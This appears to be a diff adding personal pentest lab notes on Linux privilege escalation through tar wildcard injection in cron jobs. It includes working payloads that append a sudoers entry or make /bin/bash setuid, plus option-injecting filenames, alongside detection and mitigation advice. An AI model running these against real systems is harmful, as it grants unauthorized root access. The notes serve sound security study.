@@ -1,0 +1,371 @@
+# Linux Privilege Escalation – Wildcard Abuse
+
+## Overview
+
+Wildcard characters are interpreted by the shell before a command executes. They allow flexible file matching but can introduce security risks when used in scripts or cron jobs running with elevated privileges.
+
+Common wildcard characters:
+
+| Character | Meaning |
+|----------|---------|
+| `*` | matches any number of characters |
+| `?` | matches a single character |
+| `[ ]` | matches any one character inside brackets |
+| `~` | expands to a user's home directory |
+| `-` | denotes a range inside brackets |
+
+Example:
+
+```bash
+ls *.txt
+```
+
+matches all files ending in `.txt`.
+
+Wildcard abuse occurs when a privileged script uses a wildcard (`*`) to process files in a directory that an attacker can write to. The attacker can create specially crafted filenames that are interpreted as command-line arguments.
+
+---
+
+# Why Wildcard Abuse Works
+
+Shell wildcard expansion happens before the command executes.
+
+Example:
+
+```bash
+tar -zcf backup.tar.gz *
+```
+
+The `*` is expanded by the shell into a list of filenames:
+
+```bash
+tar -zcf backup.tar.gz file1 file2 file3
+```
+
+If a filename begins with `--`, many programs interpret it as a command-line option instead of a file.
+
+This behaviour allows attackers to inject malicious arguments.
+
+---
+
+# Tar Wildcard Exploitation
+
+The `tar` utility includes an option:
+
+```bash
+--checkpoint-action
+```
+
+From the man page:
+
+```text
+--checkpoint[=N]
+Display progress messages every Nth record.
+
+--checkpoint-action=ACTION
+Run ACTION on each checkpoint.
+```
+
+This allows arbitrary commands to execute during tar operations.
+
+---
+
+# Vulnerable Cron Job Example
+
+Suppose a cron job exists:
+
+```bash
+*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
+```
+
+Key issues:
+
+- wildcard used
+- script runs automatically
+- tar command processes attacker-controlled files
+- command runs with elevated privileges
+
+Because `*` expands to all files, attacker-controlled filenames may be interpreted as tar arguments.
+
+---
+
+# Exploitation Strategy
+
+We create files whose names resemble tar command options.
+
+Create malicious script:
+
+```bash
+echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
+```
+
+Create filenames that tar will interpret as options:
+
+```bash
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+```
+
+Verify files:
+
+```bash
+ls -la
+```
+
+Example output:
+
+```text
+-rw-rw-r-- 1 htb-student htb-student 1 --checkpoint=1
+-rw-rw-r-- 1 htb-student htb-student 1 --checkpoint-action=exec=sh root.sh
+-rw-rw-r-- 1 htb-student htb-student 60 root.sh
+```
+
+---
+
+# What Happens Internally
+
+When cron runs:
+
+```bash
+tar -zcf backup.tar.gz *
+```
+
+Wildcard expansion converts:
+
+```bash
+*
+```
+
+into:
+
+```bash
+--checkpoint=1
+--checkpoint-action=exec=sh root.sh
+root.sh
+existing_files...
+```
+
+Tar interprets these as command options:
+
+```bash
+tar -zcf backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh root.sh ...
+```
+
+Tar executes:
+
+```bash
+sh root.sh
+```
+
+which modifies sudoers file.
+
+---
+
+# Result
+
+Check sudo privileges:
+
+```bash
+sudo -l
+```
+
+Example output:
+
+```text
+User htb-student may run the following commands:
+(root) NOPASSWD: ALL
+```
+
+Escalate to root:
+
+```bash
+sudo su
+```
+
+Root shell obtained.
+
+---
+
+# Identifying Wildcard Abuse Opportunities
+
+Look for:
+
+- cron jobs using wildcards
+- scripts using tar with *
+- backup scripts
+- log rotation scripts
+- file compression scripts
+- scripts operating in writable directories
+
+Common vulnerable patterns:
+
+```bash
+tar -cf archive.tar *
+cp * /backup/
+rm *
+chmod *.*
+```
+
+Search cron jobs:
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+```
+
+Search scripts:
+
+```bash
+grep -R "\*" /opt /usr/local /home 2>/dev/null
+```
+
+---
+
+# Other Programs Vulnerable to Wildcard Abuse
+
+Tar is the most well-known, but other programs may also interpret filenames as arguments:
+
+- rsync
+- cp
+- mv
+- chmod
+- chown
+- zip
+- unzip
+- scp
+- git
+- find
+
+Example risky pattern:
+
+```bash
+chmod 777 *
+```
+
+---
+
+# Detecting Writable Target Directories
+
+Check permissions on directories referenced in scripts:
+
+```bash
+ls -ld /home/htb-student
+```
+
+Writable directories increase risk.
+
+Search writable directories:
+
+```bash
+find / -type d -perm -o+w 2>/dev/null
+```
+
+---
+
+# Practical Attack Conditions
+
+Wildcard abuse typically requires:
+
+1. wildcard used in script
+2. attacker-controlled directory
+3. script executed as root or privileged user
+4. vulnerable binary interpreting filenames as arguments
+
+Cron jobs are ideal because execution is automatic.
+
+---
+
+# Defensive Mitigation
+
+Secure scripts should:
+
+use `--` to stop argument parsing:
+
+```bash
+tar -zcf backup.tar.gz -- *
+```
+
+use absolute file lists:
+
+```bash
+tar -zcf backup.tar.gz file1 file2
+```
+
+avoid running scripts in writable directories
+
+restrict permissions on sensitive directories
+
+validate filenames before processing
+
+---
+
+# Quick Wildcard Abuse Checklist
+
+## Search cron jobs
+
+```bash
+cat /etc/crontab
+ls -la /etc/cron*
+crontab -l
+```
+
+---
+
+## Search scripts for wildcard usage
+
+```bash
+grep -R "\*" / 2>/dev/null
+```
+
+---
+
+## Identify writable directories
+
+```bash
+find / -type d -perm -o+w 2>/dev/null
+```
+
+---
+
+## Create malicious checkpoint payload
+
+```bash
+echo 'chmod +s /bin/bash' > root.sh
+```
+
+---
+
+## Create wildcard injection files
+
+```bash
+echo "" > "--checkpoint-action=exec=sh root.sh"
+echo "" > --checkpoint=1
+```
+
+---
+
+# Key Takeaways
+
+- wildcard expansion occurs before command execution
+- filenames beginning with `--` may be interpreted as arguments
+- tar checkpoint feature allows command execution
+- cron jobs frequently expose wildcard abuse opportunities
+- writable directories increase risk
+- tar wildcard injection is one of the most reliable Linux privilege escalation techniques
+- always check backup scripts and cron jobs during enumeration
+
+---
+
+# Tags
+
+#linux
+#privilege-escalation
+#wildcard-abuse
+#cron
+#tar
+#post-exploitation
+#enumeration
+#ctf
+#pentesting
+#obsidian
